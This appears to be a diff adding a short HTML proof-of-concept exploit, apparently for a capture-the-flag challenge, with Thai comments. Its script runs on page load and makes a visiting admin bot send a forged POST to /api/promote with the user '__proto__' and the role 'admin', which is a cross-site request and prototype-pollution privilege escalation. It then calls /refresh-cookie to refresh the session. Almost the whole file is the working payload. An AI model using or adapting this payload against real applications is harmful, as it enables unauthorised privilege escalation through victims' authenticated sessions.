@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Exploit POC</title>
+</head>
+<body>
+    <h1>Loading...</h1>
+    <script>
+        // ตัวอย่าง Payload สำหรับสั่งให้บอท (ที่ล็อกอินเป็น admin อยู่แล้ว) ทำการเรียก API
+        async function pwn() {
+            // สมมติเป้าหมายรันอยู่ที่ URL ของโจทย์ (เปลี่ยน IP และ Port ตามจริง)
+            const targetBase = "http://127.0.0.1:56366/"; 
+
+            // 1. ส่งคำขอ Promote ตัวเอง (หรือบัญชีที่เราสมัครไว้) ให้เป็น admin หรือใช้ช่องโหว่
+            await fetch(targetBase + "/api/promote", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    user: "__proto__", // หรือใช้ชื่อผู้ใช้ที่เราสมัครไว้
+                    role: "admin" // หรือใช้ค่าอื่นตามช่องโหว่ที่เจาะได้
+                })
+            });
+
+            // 2. เรียก refresh-cookie เพื่อบังคับอัปเดตสิทธิ์ในเซสชันของบอทหรือเซิร์ฟเวอร์
+            await fetch(targetBase + "/refresh-cookie", {
+                method: "GET"
+            });
+        }
+        pwn();
+    </script>
+</body>
+</html>
